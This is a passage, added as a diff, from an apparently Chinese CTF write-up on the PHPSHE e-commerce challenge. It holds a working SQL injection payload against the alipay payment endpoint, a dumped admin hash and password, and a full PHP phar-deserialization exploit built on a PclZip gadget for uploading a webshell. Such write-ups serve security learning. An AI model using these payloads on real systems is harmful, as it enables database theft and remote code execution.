@@ -136,6 +136,179 @@ payload=var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
 flag{ec5c334b-a625-4a44-bede-7fb5dd20ef87} int(43)
 ```
 
+## PHPSHE
+
+看是个电商系统 找CVE
+
+https://anquan.baidu.com/article/697
+
+复现SQL注入
+
+注入点
+```
+include/plugin/payment/alipay/pay.php?id=
+```
+
+POC:
+```
+pay` where 1=1 union select 1,2,user(),4,5,6,7,8,9,10,11,12%23_
+```
+
+形成注入
+
+```sql
+select * from `pe_order_pay` where 1=1 union select 1,2,user(),4,5,6,7,8,9,10,11,12 #`_ where
+```
+
+对``_``使用有限制，无法使用information_schema
+
+使用无列名注入
+
+```
+(select`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1)
+```
+
+得到
+
+```
+admin 
+2476bf5c8d3653e843b6ed42c0672b91 : altman777
+```
+
+登录后台有上传点
+
+审计源码 ，特别是和原版diff发现
+
+```
+phpstorm64 diff C:\Users\Eki\Desktop\phpshe1.7 C:\Users\Eki\Desktop\source
+```
+
+有PCLZIP类，且存在反序列化利用方法
+
+```php
+  public function __destruct()
+
+  {
+      $this->extract(PCLZIP_OPT_PATH, $this->save_path);
+  }
+```
+
+可以解压zip到可控目录，那么我们可以上传一个webshell zip
+
+去找有无反序列化利用点
+
+一个是序列化，一个是对文件的操作
+
+猜测模板功能会涉及到相关操作
+
+```
+/admin.php?mod=moban&act=del
+```
+
+```php
+	case 'del':
+		pe_token_match();
+		$tpl_name = pe_dbhold($_g_tpl);
+		if ($tpl_name == 'default') pe_error('默认模板不能删除...');
+		if ($db->pe_num('setting', array('setting_key'=>'web_tpl', 'setting_value'=>$tpl_name))) {
+			pe_error('使用中不能删除');
+		}
+		else {
+			pe_dirdel("{$tpl_name}");
+			pe_success('删除成功!');
+		}
+    break;
+//调用了
+//删除文件夹
+function pe_dirdel($dir_path)
+{
+	$dir_path = str_replace("..", " ", $dir_path);
+	if (is_file($dir_path)) {
+		#unlink($dir_path);
+	}
+	else {
+		$dir_arr = glob(trim($dir_path).'/*');
+		if (is_array($dir_arr)) {
+			foreach ($dir_arr as $k => $v) {
+				pe_dirdel($v, $type);
+			}	
+		}
+		#rmdir($dir_path);
+	}
+}
+```
+
+``is_file``会触发phar反序列化，那么解法很明显了
+
+上传zip
+
+生成exp
+
+```php
+<?php
+    class PclZip
+    {
+        // ----- Filename of the zip file
+        var $zipname = '';
+
+        // ----- File descriptor of the zip file
+        var $zip_fd = 0;
+
+        // ----- Internal error handling
+        var $error_code = 1;
+        var $error_string = '';
+
+        // ----- Current status of the magic_quotes_runtime
+        // This value store the php configuration for magic_quotes
+        // The class can then disable the magic_quotes and reset it after
+        var $magic_quotes_status;
+        var $save_path;
+
+        // --------------------------------------------------------------------------------
+        // Function : PclZip()
+        // Description :
+        //   Creates a PclZip object and set the name of the associated Zip archive
+        //   filename.
+        //   Note that no real action is taken, if the archive does not exist it is not
+        //   created. Use create() for that.
+        // --------------------------------------------------------------------------------
+        function __construct($p_zipname)
+        {
+            //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::PclZip', "zipname=$p_zipname");
+
+            // ----- Tests the zlib
+            
+
+            // ----- Set the attributes
+            $this->zipname = $p_zipname;
+            $this->zip_fd = 0;
+            $this->magic_quotes_status = -1;
+
+            // ----- Return
+            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 1);
+            return;
+        }
+    }
+
+    $o=new PclZip("/var/www/html/data/attachment/2020-10/2020101509270216077w.zip");
+    $o->save_path='/var/www/html/data';
+    @unlink("test.phar");
+    $phar = new Phar("test.phar"); //后缀名必须为phar，生成之后可以修改
+    $phar->startBuffering();
+    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub
+    $phar->setMetadata($o); //将自定义的meta-data存入manifest
+    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
+    //签名自动计算
+    $phar->stopBuffering();
+?>
+```
+
+解压上传zip GetShell
+
+这里需要注意要传入参数token和Referer，来通过CSRF的校验
+
 ### 参考资料
 
 https://www.freebuf.com/articles/web/213359.html
+
+https://nikoeurus.github.io/2019/10/14/RoarCTF
